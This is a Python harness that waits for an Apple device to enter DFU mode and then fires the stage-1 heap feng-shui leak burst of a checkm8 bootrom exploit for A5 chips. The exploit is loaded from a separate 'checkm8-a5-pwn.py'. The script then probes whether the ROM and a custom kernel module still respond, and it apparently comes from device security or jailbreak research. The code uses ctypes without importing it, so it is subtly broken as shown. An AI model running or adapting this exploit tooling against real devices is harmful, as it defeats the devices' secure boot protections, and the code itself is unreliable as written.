#!/usr/bin/env python3
"""Hybrid burst: wait for fresh DFU entry, fire the feng-shui leak burst,
then verify the aftermath - all inside the fresh-entry burst window.

Sequence (launched BEFORE the user's power-hold DFU dance):
  1. poll sysfs for 05ac:1227 (fast)
  2. the instant it appears: module capture check (read-only)
  3. libusb acquire + the DAY-ONE stage-1: 620 leak requests,
     in-cancel mode (cancel at 0x40 bytes), the proven class
  4. aftermath: serve checks (healthy? deadened? -110?), a pushed A1
     control TD + kernel kick (does the push engine run post-burst?),
     module ring/ctx state
The fresh-entry window tolerates a continuous burst (day one: 620
requests); any 25s idle gap wastes it. Everything here is the safe
class: complete/served usbfs transfers, the day-one timed cancels
(usbfs-level, proven), one complete pushed TD.
"""
import fcntl
import glob
import importlib.util
import os
import struct
import sys
import time

RB_SIZE = 8 + 4096
ST_SIZE = 40
IOC_PUSH = (1 << 30) | (32 << 16) | (ord("R") << 8) | 1
IOC_STATE = (2 << 30) | (ST_SIZE << 16) | (ord("R") << 8) | 3
IOC_READBACK = (3 << 30) | (RB_SIZE << 16) | (ord("R") << 8) | 7
USBDEVFS_CONTROL = (3 << 30) | (24 << 16) | (0x55 << 8) | 0

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
dayone = importlib.util.module_from_spec(spec)
spec.loader.exec_module(dayone)  # tool's main is __main__-guarded


class Ctl(ctypes.Structure):
    _fields_ = [("bmRequestType", ctypes.c_ubyte), ("bRequest", ctypes.c_ubyte),
                ("wValue", ctypes.c_ushort), ("wIndex", ctypes.c_ushort),
                ("wLength", ctypes.c_ushort), ("timeout", ctypes.c_uint),
                ("data", ctypes.c_void_p)]


def wait_dfu(timeout=600, poll=0.05):
    t0 = time.time()
    while time.time() - t0 < timeout:
        for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
            try:
                if open(p).read().strip() == "1227":
                    return os.path.dirname(p), time.time() - t0
            except OSError:
                pass
        time.sleep(poll)
    return None, None


def module_state(rfd):
    buf = bytearray(ST_SIZE)
    fcntl.ioctl(rfd, IOC_STATE, buf, True)
    f = struct.unpack("<QIIIIIIII", buf)
    return dict(slot=f[1], free=f[3], cyc=f[4], captured=f[5],
                pushed=f[6], deq_off=f[7])


def module_readback(rfd, n=32):
    buf = bytearray(RB_SIZE)
    struct.pack_into("<I", buf, 0, min(n, 4096))
    fcntl.ioctl(rfd, IOC_READBACK, buf, True)
    return bytes(buf[8:8 + min(n, 4096)])


def module_push(rfd, setup, data_len, dir_in=True):
    cdata = (ctypes.c_ubyte * max(64, data_len))()
    txn = struct.pack("<8sIBBBBQII", setup, data_len, 1 if data_len else 0,
                      1, 1 if dir_in else 0, 0, ctypes.addressof(cdata), 0, 0)
    return fcntl.ioctl(rfd, IOC_PUSH, txn)


def usbfs_serve(timeout_ms=300):
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() != "1227":
                continue
        except OSError:
            continue
        n = os.path.dirname(p)
        bus = int(open(n + "/busnum").read())
        dev = int(open(n + "/devnum").read())
        fd = os.open("/dev/bus/usb/%03d/%03d" % (bus, dev), os.O_RDWR)
        buf = ctypes.create_string_buffer(255)
        ct = Ctl(0x80, 6, 0x0303, 0x0409, 255, timeout_ms,
                 ctypes.cast(buf, ctypes.c_void_p))
        try:
            r = fcntl.ioctl(fd, USBDEVFS_CONTROL, ct)
            return r, buf.raw[:max(0, r)]
        except OSError as e:
            return -e.errno, b""
        finally:
            os.close(fd)
    return None, b""


def main():
    print("[burst] waiting for fresh DFU entry (do the power-hold + DFU dance)")
    node, waited = wait_dfu()
    if not node:
        print("[burst] NO DFU ENTRY within 600s")
        return 1
    print("[burst] DFU appeared after %.1fs: %s" % (waited, node))

    rfd = os.open("/dev/raw0", os.O_RDWR)
    st = module_state(rfd)
    print("[burst] module: captured=%d slot=%d" % (st["captured"], st["slot"]))

    # let the kernel's enum settle just enough for libusb to open it
    time.sleep(1.0)

    usb = dayone.LibUSB()
    print("[burst] day-one libusb wrapper ready")

    t0 = time.time()
    try:
        live = dayone.stage1(usb, 3, 620, 'in-cancel', 1000, 500, False)
    except SystemExit as e:
        print("[burst] stage1 SystemExit: %s" % e)
        live = None
    except Exception as e:
        print("[burst] stage1 error: %r" % e)
        live = None
    print("[burst] stage1 done in %.1fs live=%r" % (time.time() - t0, live))

    # aftermath 1: does the ROM still serve?
    for i in range(3):
        r, data = usbfs_serve()
        print("[burst] post-burst serve%d: ret=%r cpid=%s"
              % (i, r, "CPID" in data.decode("utf-16le", "ignore")))
        time.sleep(0.2)

    # aftermath 2: does the push engine run post-burst?
    try:
        module_push(rfd, bytes([0x80, 0x06, 0x00, 0x01, 0x00, 0x00, 0x12, 0x00]), 0x12)
        r, _ = usbfs_serve()
        time.sleep(0.2)
        rb = module_readback(rfd, 24)
        print("[burst] post-burst push kick=%r staging=%s" % (r, rb[:18].hex()))
    except Exception as e:
        print("[burst] aftermath error %r" % e)

    st = module_state(rfd)
    print("[burst] end module state: captured=%d pushed=%d deq_off=%d"
          % (st["captured"], st["pushed"], st["deq_off"]))
    return 0


if __name__ == "__main__":
    sys.exit(main())
